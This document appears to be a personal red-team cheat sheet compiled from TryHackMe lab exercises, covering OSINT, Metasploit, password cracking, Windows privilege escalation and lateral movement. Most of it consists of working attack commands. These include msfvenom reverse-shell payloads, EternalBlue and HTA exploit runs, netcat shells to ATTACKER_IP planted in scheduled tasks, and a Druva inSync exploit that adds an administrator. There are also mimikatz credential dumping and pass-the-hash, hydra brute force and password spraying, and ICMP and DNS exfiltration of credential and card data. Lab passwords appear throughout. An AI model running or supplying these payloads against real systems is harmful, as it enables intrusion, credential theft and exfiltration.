## OSINT

Open source intelligence

## Tools

`\is` to query the WHOIS database
`nslookup`, `dig`, or `host` to query DNS servers

## Search sites

https://www.exploit-db.com/google-hacking-database
Ex Google: intext:"index of" ".sql"

How would you search using Google for xls indexed for http://clinic.thmredteam.com?
filetype:xls site:clinic.thmredteam.com

## Threat Intelligence Platform

Threat Intelligence Platform will launch a series of tests from malware checks to WHOIS and DNS queries.
https://threatintelligenceplatform.com/

## Censys

Censys Search can provide a lot of information about IP addresses and domains.
https://search.censys.io/

## Shodan

Shodan: Passive Reconnaissance
https://www.shodan.io/host/

## Recon-ng
Recon-ng is a framework that helps automate the OSINT work.
Recon-ng is a full-featured reconnaissance framework designed with the goal of providing a powerful environment to conduct open source web-based reconnaissance quickly and thoroughly.
https://github.com/lanmaster53/recon-ng

## Armitage

```
cd /opt/armitage/release/unix
systemctl start postgresql && systemctl status postgresql
```

```
su ubuntu
msfdb --use-defaults delete
msfdb --use-defaults init
exit
```

Start teamserver

```
cd /opt/armitage/release/unix
./teamserver $IPADDR password
```

Start Armitage

```
cd /opt/armitage/release/unix
./armitage
```

https://www.cyb3rm3.com/1ntr0t0c2
https://www.offensive-security.com/metasploit-unleashed/msfvenom/
https://www.hackingarticles.in/msfvenom-tutorials-beginners/
https://medium.com/@jiteshofficial2004/net-sec-challenge-tryhackme-walkthrough-simplest-way-d5a9bb951b90

## MITRE ATT&CK

https://attack.mitre.org/

Exempel
https://attack.mitre.org/groups/G0096/
https://mitre-attack.github.io/attack-navigator//#layerURL=https%3A%2F%2Fattack.mitre.org%2Fgroups%2FG0096%2FG0096-enterprise-layer.json

## LOLBAS

Living off the land refers to the use of dual-use tools, which are either already installed in the victims’ environment, or are admin, forensic or system tools used maliciously.
Living Off The Land Binaries, Scripts and Libraries
The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.
https://lolbas-project.github.io/

## Metasploit

Penetration testing framework
https://www.metasploit.com/
https://www.cyb3rm3.com/1ntr0t0c2

```
msfconsole

msf5 > search eternalblue
msf5 > use 2
msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhost $IPADDR
msf5 exploit(windows/smb/ms17_010_eternalblue) > set lport 8888
msf5 exploit(windows/smb/ms17_010_eternalblue) > run
meterpreter > hashdump
meterpreter > pwd
meterpreter > dir
meterpreter > execute -f cmd.exe -c -i
meterpreter > shell
meterpreter > sysinfo
```

### Install latest Metasploit

```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
./msfinstall
dpkg --listfiles metasploit-framework
ln -s -f /opt/metasploit-framework/bin/msfconsole /usr/local/bin/msfconsole
```

### HTA attack

```
msfconsole
set LHOST 10.10.96.223
set LPORT 443
set SRVHOST 10.10.96.223
set payload windows/meterpreter/reverse_tcp
use exploit/windows/misc/hta_server
run
sessions
sessions -i 1
sysinfo
```

## Meterpreter

Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection stagers and is extended over the network at runtime.
https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

## Ubuntu

Version
```
lsb_release -a
```

## Get the IP address

```
IPADDR=$(hostname -I | cut -d' ' -f1)
```

## Venoms

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IPADDR LPORT=443 -f hta-psh -o thm.hta
```

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=443 -f vba -o vba.txt
```

## Connect via RDP

```
xfreerdp /v:10.10.40.39 /u:thm /p:TryHackM3 +clipboard
xfreerdp /v:10.10.40.39 /u:phillip /p:Claire2008 +clipboard
```

## CUPP - Common User Passwords Profiler

```
git clone https://github.com/Mebus/cupp.git
```

## Dictionary attack Hashcat

https://hashcat.net/wiki/doku.php?id=hashcat

```
brew install hashcat
```

E.g.
```
hashcat -a 3 -m 100 8d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou.txt
hashcat -a 3 -m 0 e48e13207341b6bffb7fb1622282247b ?d?d?d?d
```

## Hash ID

```
apt install hashid
```

```
https://github.com/psypanda/hashID
```

## John the Ripper password cracker

KoreLogic's rules in John the Ripper
https://contest-2010.korelogic.com/rules.html

E.g
john --wordlist=words.txt --rules=tornord --stdout 
```
[List.Rules.tornord]
Az"[0-9][0-9]" ^[!@]
```

john --wordlist=words.txt --rules=tornord > passwords.txt
hydra -L usernames-list.txt -P passwords.txt -t 4 ssh://10.10.225.196

Hydra (http://www.thc.org/thc-hydra) starting at 2022-11-05 10:09:23
[DATA] max 4 tasks per 1 server, overall 4 tasks, 180 login tries (l:9/p:20), ~45 tries per task

https://www.cyberciti.biz/faq/unix-linux-password-cracking-john-the-ripper/

Linux/Debian/Ubuntu
```
sudo unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db
john -show /tmp/crack.password.db
```

## CeWL Custom Word List generator

CeWL is a ruby app which spiders a given URL, up to a specified depth, and returns a list of words which can then be used for password crackers such as John the Ripper. Optionally, CeWL can follow external links.

https://digi.ninja/projects/cewl.php
https://github.com/digininja/CeWL
https://www.kali.org/tools/cewl/
CeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

E.g.
cewl -w list.txt -d 2 -m 2 http://thm.labs

## Hydra

```
hydra -l pittman@clinic.thmredteam.com -P pwres.txt smtp://10.10.224.93:25 -v
hydra -l phillips -P pwres.txt 10.10.230.190 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 

john --wordlist=clinic.lst --rules=Single-Extra --stdout > pwres.txt
hydra -l burgess -P pwres.txt 10.10.230.190 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
```

admin
victim
dummy
adm
sammy
phillips
burgess
pittman
guess

Fall
Autumn
Spring
Sommer
Winter

## Password spray attack

SSH
hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10

RDPassSpray
https://github.com/xFreed0m/RDPassSpray

python3 -m pip install -r requirements.txt

```
python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
```

## Network Enumeration

netstat
netstat -na
arp -a

## Linux system check

```
ls -l /etc/*-release
cat /etc/os-release
hostname
cat /etc/passwd
cat /etc/group
sudo cat /etc/shadow
ls -lh /var/mail/
```

## DNS Lookup

```
dig -t AXFR redteam.thm @10.10.113.132
```

## Simple Network Management Protocol (SNMP)

```
git clone https://gitlab.com/kalilinux/packages/snmpcheck.git
cd snmpcheck/
gem install snmp
chmod +x snmpcheck-1.9.rb
```

## Netcat

https://eternallybored.org/misc/netcat/
https://github.com/int0x33/nc.exe/

## Windows Privilege Escalation

https://benheater.com/thm-windows-privesc/

## Manipulate scheduled task

Check which user runs the scheduled task:
```
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

Check if current user can change the bat file
```
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

Inject netcat in the bat file
```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

Start listening on the attack machine
```
nc -lvp 4444
```

Rerun the task
```
schtasks /run /tn vulntask
```

## AD Delegation 

```
Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Pr$
Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose
```

## Accesschk

To check for a service DACL from the command line, you can use Accesschk from the Sysinternals suite.

accesschk64.exe -qlc thmservice

## schtasks commands

Schedules commands and programs to run periodically or at a specific time, adds and removes tasks from the schedule, starts and stops tasks on demand, and displays and changes scheduled tasks.

```
schtasks change
schtasks create
schtasks delete
schtasks end
schtasks query
schtasks run
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cm$
schtasks /query /tn thm-taskbackdoor
```

## Controlling a Service Using SC

The Windows SDK contains a command-line utility, Sc.exe, that can be used to control a service. Its commands correspond to the functions provided by the SCM. The syntax is as follows.

https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query

```
sc query
sc query type= service
SC query type= service | FIND "SERVICE_NAME"
sc query THMService
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
sc stop THMService
sc start THMService
sc config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "$
```

## whoami

```
whoami /all
```

## Registry SAM

Registry: HKEY_LOCAL_MACHINE\SAM
SAM = Security Accounts Manager.
SAM contains local user account and local group membership information, including their passwords.
Password information and privileges for domain users and groups are stored in Active Directory.
Because of the sensitivity of the data that is stored in this database, SYSTEM privileges are needed to open this registry key. This is possible with the Sysinternals tool PsExec.

## SMB server

Start a share on the attacker machine
```
mkdir share
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username thm-unpriv -password Password321 public share
```

Access it from the windows machine
```
dir \\10.10.7.8\public
```

## Impacket

Save the registry to a share
```
reg save hklm\system \\10.10.7.8\public\system.hive
reg save hklm\sam \\10.10.7.8\public\sam.hive
```

On the attacker machine
```
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.136.180
```

## Windows take ownership

Run in cmd.exe as administrator
```
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
C:\Windows\System32\> copy cmd.exe utilman.exe
```

## WES-NG: Windows Exploit Suggester - Next Generation

WES-NG is a tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 11, including their Windows Server counterparts, is supported.

At the BITSADMIN blog an in-depth article on WES-NG is available: Windows Security Updates for Hackers.

https://github.com/bitsadmin/wesng

On the windows machine

```
systeminfo > sysinfo.txt
```

```
git clone https://github.com/bitsadmin/wesng.git
cd wesng
python3 wes.py --update
python3 wes.py ../share/sysinfo.txt
```

## The WMI command-line (WMIC)

The WMI command-line (WMIC) utility provides a command-line interface for Windows Management Instrumentation (WMI). WMIC is compatible with existing shells and utility commands. The following is a general reference topic for WMIC. For more information and guidelines on how to use WMIC, including additional information on aliases, verbs, switches, and commands, see Using Windows Management Instrumentation command-line and WMIC—take command-line control over WMI.

```
wmic product get name,version,vendor
```

## Druva 6.6.3

In powershell:
```
$ErrorActionPreference = "Stop"
$cmd = "net user pwnd passwd123 /add & net localgroup administrators pwnd /add"
$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)
$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);
$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

Then check status of created user:
```
net user pwnd
```

## Sysinternals

https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
https://download.sysinternals.com/files/PSTools.zip

psexec64.exe \\10.200.19.249 -u Administrator -p Mypass123 -i cmd.exe
psexec64.exe \\10.200.19.101 -u Administrator -p Mypass123 -i cmd.exe
psexec64.exe \\10.200.19.201 -u Administrator -p Mypass123 -i cmd.exe
psexec64.exe \\10.200.19.249\Admin$ -u Administrator -p Mypass123 -i cmd.exe

```
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Navigate from attacker box
http://distributor.za.tryhackme.com/creds
```
ssh za.tryhackme.com\damien.horton@thmjmp2.za.tryhackme.com
```

Seting up the network
```
THMDCIP=10.200.19.101
systemd-resolve --interface lateralmovement --set-dns $THMDCIP --set-domain za.tryhackme.com
nslookup thmdc.za.tryhackme.com
```

```
sudo openvpn tryhackme/resources/tornord.ovpn 
```

Check the ip of the attack box:
```
ip add show lateralmovement
```

```
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.17.19 LPORT=4253 -o myservice253.exe
smbclient -c 'put myservice253.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4253; run"
```
runas /netonly /user:za\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.10.208.253 4443"

move \\thmiis.za.tryhackme.com\admin$\myservice253.exe c:\
sc.exe \\thmiis.za.tryhackme.com create thmservice-253 binPath= "%windir%\myservice253.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com start thmservice-253
sc.exe \\thmiis.za.tryhackme.com query thmservice-253

sc.exe \\thmiis.za.tryhackme.com config thmservice-253 binPath= "%windir%\myservice253.exe" start= auto

sc.exe \\thmiis.za.tryhackme.com create fake-253 binPath= "net user adm253 Password123! /add" start= auto
sc.exe \\thmiis.za.tryhackme.com start fake-253
sc.exe \\thmiis.za.tryhackme.com stop fake-253
sc.exe \\thmiis.za.tryhackme.com delete fake-253

sc.exe create fake-253 binPath= "net user adm253 Password123! /add" start= auto

ssh za\\t1_leonard.summers@thmjmp2.za.tryhackme.com
ssh za\\arthur.campbell@thmjmp2.za.tryhackme.com

## MSI installation

On the attacker machine
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4254 -f msi -o myinst254.msi
smbclient -c 'put myinst254.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST lateralmovement; set LPORT 4254; run"
```

Powershell on thmjmp2
```
$username = 't1_corine.waters';
$password = 'Korine.1994';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-CimSession -ComputerName 'thmiis.za.tryhackme.com' -Credential $credential -SessionOption $Opt -ErrorAction Stop
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinst254.msi"; Options = ""; AllUsers = $false}
```

## Create local account and add to administrators

```
net user adm253 Password253 /add & net localgroup administrators adm253 /add
```

## Mimikatz

```
ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
ssh za\\t2_abigail.cox@thmjmp2.za.tryhackme.com # Vivian2008
```

### Pass-the-Key

We can obtain the Kerberos encryption keys from memory by using mimikatz
```
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

### Pass-the-Ticket 

Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz
```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets
```

### Pass-the-Hash

Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz
```
mimikatz # privilege::debug
mimikatz # token::elevate
```

```
mimikatz # token::elevate
mimikatz # lsadump::sam
```

Use a hash:
```
token::revert
sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.17.19 4254"
```

When connection's established:
```
winrs.exe -r:THMIIS.za.tryhackme.com cmd
```

In C:\tools
```
psexec64.exe \\thmjmp2.za.tryhackme.com -u Administrator -p Mypass123 -i cmd.exe
```

xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_abigail.cox /p:Vivian2008
socat TCP4-LISTEN:13254,fork TCP4:THMIIS.za.tryhackme.com:3389
xfreerdp /v:THMJMP2.za.tryhackme.com:13254 /u:t1_thomas.moore /p:MyPazzw3rd2020

ssh tunneluser@10.50.17.19 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7254:127.0.0.1:7254 -N

```
msfconsole -q -x "use windows/http/rejetto_hfs_exec; set payload windows/shell_reverse_tcp; set lhost thmjmp2.za.tryhackme.com; set ReverseListenerBindAddress 127.0.0.1; set lport 7254; set srvhost 127.0.0.1; set srvport 6666; set rhosts 127.0.0.1; set rport 8888; run"
```

sudo nping --icmp -c 1 10.10.139.73 --data-string "BOFfile.txt"
sudo nping --icmp -c 1 10.10.139.73 --data-string "admin:password"
sudo nping --icmp -c 1 10.10.139.73 --data-string "admin2:password2"
sudo nping --icmp -c 1 10.10.139.73 --data-string "EOF"

cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/
TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com

## Nmap

UDP scan
```
nmap -sU -F 10.10.160.218
```
Hide a scan with decoys	-D DECOY1_IP1,DECOY_IP2,ME
Hide a scan with random decoys	-D RND,RND,ME
Use an HTTP/SOCKS4 proxy to relay connections	--proxies PROXY_URL
Spoof source MAC address	--spoof-mac MAC_ADDRESS
Spoof source IP address	-S IP_ADDRESS
Use a specific source port number	-g PORT_NUM or --source-port PORT_NUM
Fragment IP data into 8 bytes	-f
Fragment IP data into 16 bytes	-ff
Fragment packets with given MTU	--mtu VALUE
Specify packet length	--data-length NUM
Set IP time-to-live field	--ttl VALUE
Send packets with specified IP options	--ip-options OPTIONS
Send packets with a wrong TCP/UDP checksum	--badsum

## Ncat

Listen on a port
```
ncat -lvnp 4444
```

-l tells ncat to listen for incoming connections
-v gets more verbose output as ncat binds to a source port and receives a connection
-n avoids resolving hostnames
-p specifies the port number that ncat will listen on

ncat -lvnp 443 -c "ncat 127.0.0.1 8008"